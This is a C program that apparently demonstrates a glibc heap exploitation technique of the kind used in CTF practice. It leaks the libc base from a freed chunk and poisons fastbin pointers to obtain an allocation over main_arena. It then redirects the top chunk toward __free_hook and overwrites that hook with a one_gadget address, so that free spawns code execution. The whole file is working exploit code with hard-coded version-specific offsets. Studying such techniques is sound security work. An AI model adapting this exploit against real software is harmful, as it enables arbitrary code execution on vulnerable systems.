#include <stdio.h>
#include <stdlib.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

int main()
{
	void *p,*p1,*p2,*p3,*p4,*p5,*p6,*p7;
	long long*ptr;
	long long var=0xffffffffffffffff;
	setbufs();

	p=malloc(0x200);
	malloc(0x20);

	p6=malloc(0x78);
	malloc(0x20);
	p1=malloc(0x78);
	malloc(0x20);
	p2=malloc(0x78);
	malloc(0x20);
	p3=malloc(0x78);
	malloc(0x20);

	free(p);
	ptr=(long long*)p;
	long long libc_base=*ptr-0x3c4b78;
	long long target_addr=*ptr-0x28;
	long long top_addr=*ptr+0x10d8;
	long long one_gadget=libc_base+0x4526A;

	// freed fastbins use fd to point the bk_chunk
	free(p1);
	free(p2);
	free(p3);

	ptr=(long long*)p3;
	*ptr=0x60;
	malloc(0x78);


	p1=malloc(0x58);
	p4=malloc(0x58);
	p5=malloc(0x58);

	free(p1);
	free(p4);
	free(p5);

	ptr=(long long*)p5;
	*ptr=target_addr;
	malloc(0x58);
	p1=malloc(0x58);
	printf("alloc the top addr:%p\n",p1);
	ptr=(long long*)p1+3;
	*ptr=top_addr;

	ptr=(long long*)p3;
	*ptr=(long long)p2-0x10;

	printf("the evil alloc addr:%p\n",malloc(0x300));
	printf("and we alloc servel times:%p\n",malloc(0x300));
	printf("the returned chunk address will final overlapping __free_hook:%p\n",malloc(0x300));
	printf("then all we need to do is just overwrite the correspoding chunk:%p\n",malloc(0x200));

	p6=malloc(0x100);
	ptr=(long long*)p6;
	printf("hence we can also overwrite __free_hook:%p\n",p6);

	*(ptr+1)=one_gadget;

	free(p6);




	return 0;
}
